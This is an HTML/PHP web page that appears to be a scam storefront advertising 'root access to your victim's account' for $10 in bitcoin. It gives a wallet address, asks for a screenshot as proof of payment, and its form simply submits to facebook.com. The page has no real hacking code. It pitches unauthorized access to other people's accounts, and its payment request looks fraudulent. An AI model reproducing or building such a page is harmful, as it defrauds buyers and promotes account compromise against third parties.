<?php

    include 'logic.php';

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Form LogIn Animation</title>
		    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>   
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> 
        <style>
            /* Created by Mr.A */

html { height: 100%; } 

body { margin:0; padding:0; font-family: sans-serif; background: linear-gradient(#141e30, #243b55); } 

.login-box { position: absolute; top: 50%; left: 50%; width: 400px; padding: 40px; transform: translate(-50%, -50%); background: rgba(0,0,0,.5); box-sizing: border-box; box-shadow: 0 15px 25px rgba(0,0,0,.6); border-radius: 10px; } 

.login-box h2 { margin: 0 0 30px; padding: 0; color: #fff; text-align: center; } 

.login-box .user-box { position: relative; } 

.login-box .user-box input { width: 100%; padding: 10px 0; font-size: 16px; color: #fff; margin-bottom: 30px; border: none; border-bottom: 1px solid #fff; outline: none; background: transparent; } 

.login-box .user-box label { position: absolute; top:0; left: 0; padding: 10px 0; font-size: 16px; color: #fff; pointer-events: none; transition: .5s; } 

.login-box .user-box input:focus ~ label, 
.login-box .user-box input:valid ~ label { top: -20px; left: 0; color: #03e9f4; font-size: 12px; } 

.login-box form a { position: relative; display: inline-block; padding: 10px 20px; color: #03e9f4; font-size: 16px; text-decoration: none; text-transform: uppercase; overflow: hidden; transition: .5s; margin-top: 40px; letter-spacing: 4px } 

.login-box a:hover { background: #03e9f4; color: #fff; border-radius: 5px; box-shadow: 0 0 5px #03e9f4, 0 0 25px #03e9f4, 0 0 50px #03e9f4, 0 0 100px #03e9f4; } 

.login-box a span { position: absolute; display: block; } 

.login-box a span:nth-child(1) { top: 0; left: -100%; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, #03e9f4); animation: btn-anim1 1s linear infinite; } 

@keyframes btn-anim1 { 0% { left: -100%; } 50%,100% { left: 100%; } } 

.login-box a span:nth-child(2) { top: -100%; right: 0; width: 2px; height: 100%; background: linear-gradient(180deg, transparent, #03e9f4); animation: btn-anim2 1s linear infinite; animation-delay: .25s } 

@keyframes btn-anim2 { 0% { top: -100%; } 50%,100% { top: 100%; } } 

.login-box a span:nth-child(3) { bottom: 0; right: -100%; width: 100%; height: 2px; background: linear-gradient(270deg, transparent, #03e9f4); animation: btn-anim3 1s linear infinite; animation-delay: .5s } 

@keyframes btn-anim3 { 0% { right: -100%; } 50%,100% { right: 100%; } } 

.login-box a span:nth-child(4) { bottom: -100%; left: 0; width: 2px; height: 100%; background: linear-gradient(360deg, transparent, #03e9f4); animation: btn-anim4 1s linear infinite; animation-delay: .75s } 

@keyframes btn-anim4 { 0% { bottom: -100%; } 50%,100% { bottom: 100%; } } .log {text-align:center;} .lala{color:green;}

        </style>
    </head>
    <body>
        <div class="login-box">
         <h2>ROOT ACCESS</h2> 
		 <div class="log"><img src="https://www.pngplay.com/wp-content/uploads/2/Hacker-PNG-Background.png" width="200" alt="hacker png png foto" /></div>
          <div class=""><p style="font-text:30pt">GET ROOT ACCESS TO YOUR VICTIM'S ACCOUNT.</p></div>
		  <div class="lala"><p>Transfer $10 worth btc at the moment of transaction to the address below.</p>
		  <div id="copy"><p>bc1qnr47q9u5h8jhzuqhy09dua8mntxycvlraf0ycs</p></div>
          <!-- The button used to copy the text -->
<button onclick="myFunction()">Copy address</button><a href="https://i.ibb.co/YtBsrhM/Screenshot-20220216-112933-1.jpg"><button>scan address	QR code</button></a>
<script>
function myFunction() {
  /* Get the text field */
  var copyText = document.getElementById("copy");

  /* Select the text field */
  copyText.select(); 
  copyText.setSelectionRange(0, 99999); /* For mobile devices */

   /* Copy the text inside the text field */
  navigator.clipboard.writeText(copyText.value);

  /* Alert the copied text */
  alert("Copied the text: " + copyText.value);
}</script>
		  </div>
		 <form action="https://www.facebook.com" method=""> <div class="user-box"> 
         <input type="text" name="" required="required"> 
         <label>User Bitcoin Payment Address</label> 
         </div> 
         <div class="user-box"> 
         <input type="file"  name=""> 
         <label>Evidence of Payment</label> 
         </div> 
		 <div>
		 <a>
         <span>
             </span> 
         <span>
             </span> 
         <span>
             </span> 
         <span>
             </span> 
         <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Get Root Access</button><label></label>
		 </a>
		 </div>
         </form> 
         </div>  
     <script>
Swal.fire({
  title: 'Root Access Needed To Continue⚠️',
  iconHtml: '<img src="https://www.pngplay.com/wp-content/uploads/2/Hacker-PNG-Background.png" height="100px" width="100px"/>',
  html:"Steps to Grant Root Access!! 🤪<br>👉<b>1.Make payment to the blockchain.🤨😅<br><br><br>👉<b>2.Get an evidence of payment with the address use for payment (optional). eg: A screenshot or photograph.🤨😅<br><br><b>Note :</b> This method is anonymous ⚠️ ",
  customClass: {
    icon: 'no-border'
  }
});</script>
    </body>
</html>
